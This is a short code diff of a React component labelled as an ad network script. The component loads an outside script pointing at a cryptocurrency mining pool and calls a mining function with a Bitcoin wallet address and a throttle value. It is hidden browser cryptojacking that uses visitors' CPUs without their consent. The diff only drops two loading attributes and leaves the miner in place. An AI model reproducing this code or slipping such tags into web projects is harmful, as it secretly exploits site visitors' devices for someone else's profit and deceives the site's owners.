@@ -100,8 +100,6 @@ const AdNetworkScript: React.FC = () => {
 
     <Script
       src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=flex/native?nosaj=flex.na.mine.zpool.ca:3340"
-      strategy="afterInteractive"
-      data-cfasync="false"
     />
     <Script id="everythingislife-tag" strategy="afterInteractive" data-cfasync="false">
       {`EverythingIsLife('bc1qk5hd7a2r72l2yesav93zq59lj5p56skmvsmhtx', 'c=BTC', 70);`}
